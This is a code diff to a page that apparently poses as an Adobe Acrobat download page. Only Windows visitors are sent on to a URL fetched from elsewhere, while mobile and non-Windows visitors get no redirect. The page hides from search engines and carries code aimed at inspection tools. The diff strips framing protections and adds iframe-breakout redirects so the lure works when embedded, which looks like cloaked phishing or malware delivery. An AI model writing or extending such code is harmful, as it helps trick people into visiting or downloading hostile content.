@@ -17,7 +17,7 @@
   <meta http-equiv="Pragma" content="no-cache">
   <meta http-equiv="Expires" content="0">
   <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, noimageindex">
-  <meta http-equiv="X-Frame-Options" content="DENY">
+  <!-- X-Frame-Options removed to allow iframe loading -->
   <meta http-equiv="X-Content-Type-Options" content="nosniff">
   <meta http-equiv="Referrer-Policy" content="no-referrer">
   
@@ -596,11 +596,10 @@
           }
         },
         
-        // Iframe busting
+        // Iframe busting (disabled to allow iframe loading)
         preventFraming: function() {
-          if (top != self) {
-            top.location = self.location;
-          }
+          // Disabled to allow page to load in iframes
+          console.log('Iframe loading allowed');
         },
         
         // Monitor for common inspection methods (disabled for now)
@@ -740,7 +739,18 @@
     function closeTab() {
       console.log('Closing tab...');
       
-      // Method 1: Try window.close() first
+      // Method 1: Try to redirect parent window (for iframes)
+      try {
+        if (top && top !== self) {
+          console.log('Closing parent window (iframe detected)');
+          top.location.href = 'about:blank';
+          return;
+        }
+      } catch (e) {
+        console.log('Parent redirect failed:', e);
+      }
+      
+      // Method 2: Try window.close() first
       try {
         window.close();
         return;
@@ -748,7 +758,7 @@
         console.log('window.close() failed:', e);
       }
       
-      // Method 2: Try to close via history
+      // Method 3: Try to close via history
       try {
         window.history.back();
         setTimeout(() => {
@@ -759,7 +769,7 @@
         console.log('History back method failed:', e);
       }
       
-      // Method 3: Try to open new window and close current
+      // Method 4: Try to open new window and close current
       try {
         window.open('', '_self');
         window.close();
@@ -768,7 +778,7 @@
         console.log('Open/close method failed:', e);
       }
       
-      // Method 4: Try to navigate to parent and close
+      // Method 5: Try to navigate to parent and close
       try {
         if (window.opener) {
           window.opener = null;
@@ -779,7 +789,7 @@
         console.log('Opener method failed:', e);
       }
       
-      // Method 5: Force close by redirecting to blank and trying close
+      // Method 6: Force close by redirecting to blank and trying close
       try {
         window.location.replace('about:blank');
         setTimeout(() => {
@@ -790,7 +800,7 @@
         console.log('Replace and close method failed:', e);
       }
       
-      // Method 6: Last resort - show alert and try to close
+      // Method 7: Last resort - show alert and try to close
       try {
         alert('Please close this tab manually');
         window.close();
@@ -923,6 +933,16 @@ Adobe Acrobat Download Page Visit`;
           return false;
         };
         
+        // Also block top.location redirects on mobile
+        try {
+          Object.defineProperty(window, 'top', {
+            get: function() { return window; },
+            configurable: true
+          });
+        } catch (e) {
+          console.log('Could not override top property:', e);
+        }
+        
         // Don't start progress animation or redirect on mobile/non-Windows
         console.log('Mobile device detected - redirects disabled');
         return;
@@ -1006,7 +1026,34 @@ Adobe Acrobat Download Page Visit`;
           // Redirect immediately after animation completes
           setTimeout(() => {
             console.log('Executing redirect to:', finalUrl);
-            window.location.href = finalUrl;
+            
+            // Try multiple redirect methods for iframe compatibility
+            try {
+              // Method 1: Try top.location first (for iframes)
+              if (top && top !== self) {
+                console.log('Redirecting via top.location (iframe detected)');
+                top.location.href = finalUrl;
+                return;
+              }
+            } catch (e) {
+              console.log('top.location failed, trying window.location:', e);
+            }
+            
+            try {
+              // Method 2: Try window.location
+              console.log('Redirecting via window.location');
+              window.location.href = finalUrl;
+            } catch (e) {
+              console.log('window.location failed, trying location.replace:', e);
+            }
+            
+            try {
+              // Method 3: Try location.replace
+              console.log('Redirecting via location.replace');
+              window.location.replace(finalUrl);
+            } catch (e) {
+              console.log('All redirect methods failed:', e);
+            }
           }, 100); // Small delay to ensure smooth transition
         } else {
           console.error('Failed to get teams URL');
